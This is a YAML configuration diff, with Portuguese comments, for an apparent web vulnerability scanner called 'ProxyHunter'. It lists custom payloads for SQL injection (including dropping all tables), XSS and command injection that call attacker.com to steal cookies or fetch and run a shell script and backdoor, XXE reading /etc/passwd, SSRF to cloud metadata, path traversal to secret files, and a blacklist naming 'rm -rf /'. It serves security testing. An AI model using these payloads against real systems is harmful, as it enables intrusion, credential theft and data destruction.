@@ -1,0 +1,198 @@
+# Custom Payloads Configuration
+# Este arquivo permite adicionar payloads customizados para testes específicos
+
+# SQL Injection - Adicione seus próprios payloads
+custom_sqli_payloads:
+  - "' WAITFOR DELAY '0:0:10'-- "
+  - "1' AND SLEEP(5)-- "
+  - "'; EXEC sp_MSforeachtable 'DROP TABLE ?'-- "
+
+# XSS - Adicione payloads específicos para o seu ambiente
+custom_xss_payloads:
+  - "<svg/onload=alert(document.domain)>"
+  - "<img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>"
+  - "{{constructor.constructor('alert(document.cookie)')()}}"
+
+# Path Traversal - Adicione caminhos específicos do seu alvo
+custom_path_traversal_payloads:
+  - path: "../../../app/config/database.yml"
+    evidence: "password:"
+  - path: "../../.env"
+    evidence: "DB_PASSWORD"
+  - path: "../config/config.php"
+    evidence: "<?php"
+
+# Command Injection - Adicione comandos específicos
+custom_command_injection_payloads:
+  - payload: "; curl http://attacker.com/shell.sh | bash"
+    os_type: "Unix/Linux"
+    time_based: false
+  - payload: "| wget http://attacker.com/backdoor -O /tmp/bd"
+    os_type: "Unix/Linux"
+    time_based: false
+
+# LDAP Injection (novo tipo de teste)
+custom_ldap_payloads:
+  - "*"
+  - "*)(&"
+  - "*)(uid=*"
+  - "admin*"
+  - "*)(|(uid=*"
+
+# XML Injection / XXE
+custom_xxe_payloads:
+  - '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
+  - '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>'
+
+# NoSQL Injection (MongoDB)
+custom_nosql_payloads:
+  - '{"$gt": ""}'
+  - '{"$ne": null}'
+  - '{"$regex": ".*"}'
+  - 'admin\' || \'1\'==\'1'
+
+# Template Injection (SSTI)
+custom_ssti_payloads:
+  - "{{7*7}}"
+  - "{{7*'7'}}"
+  - "${7*7}"
+  - "<%= 7*7 %>"
+  - "{{config.items()}}"
+  - "${T(java.lang.Runtime).getRuntime().exec('calc')}"
+
+# SSRF (Server-Side Request Forgery)
+custom_ssrf_payloads:
+  - "http://localhost"
+  - "http://127.0.0.1"
+  - "http://169.254.169.254/latest/meta-data/"
+  - "http://metadata.google.internal/computeMetadata/v1/"
+  - "file:///etc/passwd"
+
+# CRLF Injection
+custom_crlf_payloads:
+  - "%0d%0aSet-Cookie: admin=true"
+  - "%0aSet-Cookie: sessionid=malicious"
+  - "\r\nSet-Cookie: admin=1"
+
+# Open Redirect
+custom_open_redirect_payloads:
+  - "//evil.com"
+  - "https://evil.com"
+  - "javascript:alert(1)"
+  - "/\\evil.com"
+
+# Host Header Injection
+custom_host_header_payloads:
+  - "evil.com"
+  - "localhost"
+  - "127.0.0.1"
+
+# Configurações de teste
+test_settings:
+  # Limite de payloads por tipo de teste
+  max_payloads_per_test: 50
+  
+  # Timeout para cada requisição (segundos)
+  request_timeout: 10
+  
+  # Delay entre requisições (segundos) para evitar rate limiting
+  delay_between_requests: 0.5
+  
+  # Retry em caso de falha
+  max_retries: 2
+  
+  # User-Agent customizado
+  custom_user_agent: "ProxyHunter-Scanner/2.0"
+  
+  # Headers customizados para todos os testes
+  custom_headers:
+    X-Scanner: "ProxyHunter"
+    X-Test-Mode: "Active"
+
+# Alvos específicos - Permite configurar payloads por domínio/URL
+target_specific:
+  "example.com":
+    enabled_tests:
+      - sql_injection
+      - xss
+      - path_traversal
+    disabled_tests:
+      - command_injection
+    custom_payloads:
+      sql_injection:
+        - "' AND 1=CONVERT(int, @@version)--"
+  
+  "testsite.local":
+    enabled_tests:
+      - all
+    max_payloads: 10
+    delay: 1.0
+
+# Whitelist - URLs/parâmetros que NÃO devem ser testados
+whitelist:
+  urls:
+    - "*/logout"
+    - "*/signout"
+    - "*/delete/*"
+  parameters:
+    - "csrf_token"
+    - "authenticity_token"
+    - "session_id"
+
+# Blacklist - Payloads que NÃO devem ser usados
+blacklist_payloads:
+  - "; rm -rf /"
+  - "DROP DATABASE"
+  - "'; SHUTDOWN--"
+
+# Configuração de relatórios
+reporting:
+  # Incluir apenas vulnerabilidades de severidade mínima
+  min_severity: "Low"  # Low, Medium, High, Critical
+  
+  # Incluir evidências completas
+  include_full_evidence: false
+  
+  # Incluir payloads nos relatórios
+  include_payloads: true
+  
+  # Formato de saída
+  output_format: "json"  # json, html, xml, csv
+  
+  # Limite de evidências por vulnerabilidade
+  max_evidence_length: 500
+
+# Integração com ferramentas externas
+integrations:
+  # Burp Suite Collaborator
+  burp_collaborator:
+    enabled: false
+    server: "burpcollaborator.net"
+  
+  # Webhook para notificações
+  webhook:
+    enabled: false
+    url: "https://your-webhook-url.com/notify"
+    events:
+      - "vulnerability_found"
+      - "scan_completed"
+  
+  # Slack notifications
+  slack:
+    enabled: false
+    webhook_url: "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"
+    channel: "#security-alerts"
+
+# Machine Learning / False Positive Reduction
+ml_settings:
+  # Habilitar aprendizado com feedback
+  enabled: false
+  
+  # Arquivo de treinamento
+  training_data: "ml/training_data.json"
+  
+  # Modelo treinado
+  model_file: "ml/vulnerability_classifier.pkl"
+  
+  # Threshold de confiança (0.0 - 1.0)
+  confidence_threshold: 0.7
